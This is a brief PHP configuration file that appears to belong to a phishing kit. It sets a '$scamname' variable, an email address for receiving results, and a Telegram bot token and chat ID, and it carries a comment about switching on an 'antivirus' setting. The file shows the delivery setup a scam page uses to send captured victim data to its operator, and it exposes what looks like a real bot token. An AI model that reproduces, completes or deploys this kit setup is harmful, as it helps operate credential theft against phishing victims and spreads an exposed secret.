<?php 
session_start();
error_reporting(0);

// Turn ON the antivirus on Anticonfig


$scamname = ""; //
//Your Email
$send = "";
//Telegram Bot Token
$TGBO = '7941983182:AAE-HHbIbv5x4i2qT6To_VK89Chu8ntbQGo';
//Telegram ChatID 
$cID = '6969127152';

?>
